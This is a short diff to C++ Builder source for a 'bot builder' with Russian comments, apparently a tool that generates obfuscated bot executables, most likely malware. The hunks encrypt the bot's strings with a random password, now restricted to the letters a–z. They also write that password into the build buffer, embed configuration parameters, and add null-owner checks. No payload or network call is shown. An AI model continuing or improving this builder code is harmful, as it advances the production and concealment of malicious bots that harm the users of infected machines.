@@ -187,7 +187,7 @@ __fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
 	// Инициализируем классы для шифрования строк
 	FStringsEncryptor = new TBotStringsEncryptor(this);
 
-	FStringsPassword  = new TStringsPasswordParam(this, false, false, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE, "Пароль шифрования строк");
+	FStringsPassword  = new TStringsPasswordParam(NULL, false, false, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE, "Пароль шифрования строк");
 	FStringsPassword->AsAnsiString = "----";
 
 	// Добавляем основные параметры
@@ -256,7 +256,7 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
     Message(Status_StartBuild);
 
 	// Создаём случайый пароль шифрования строк
-	PCHAR StrPass = Random::RandomString(MAX_SESSION_PASSW_SIZE - 1, 32, 255);
+	PCHAR StrPass = Random::RandomString(MAX_SESSION_PASSW_SIZE - 1, 'a', 'z');
 	FStringsPassword->AsAnsiString = StrPass;
 
 	// Проверяем параметры
@@ -309,9 +309,10 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
 		// Шифруем строки бота
 		FStringsEncryptor->Encrypt(Buf, BufSize, StrPass);
-
-
 		STR::Free(StrPass);
+
+		// Записываем пароль для строк
+		FStringsPassword->Write(Buf, BufSize);
 
 		// Вшиваем параметры
 		for (int i = 0; i < Count; i++)
@@ -775,7 +776,7 @@ void __fastcall TBotBuilder::InitializeModules()
 //****************************************************************************
 __fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted,
 	const char* Name, DWORD Size, const char* Title)
-	: TCollectionItem(AOwner->FParams)
+	: TCollectionItem((AOwner) ? AOwner->FParams : NULL)
 {
 	if (STRA::IsEmpty(Name))
 		throw Exception("Unknown param name!");
@@ -899,7 +900,8 @@ void __fastcall TBotParam::DoChanged()
 void __fastcall TBotParam::Changed()
 {
 	DoChanged();
-	FOwner->ParamValueChanged(this);
+	if (FOwner)
+		FOwner->ParamValueChanged(this);
 }
 //-----------------------------------------------------------------------------
 
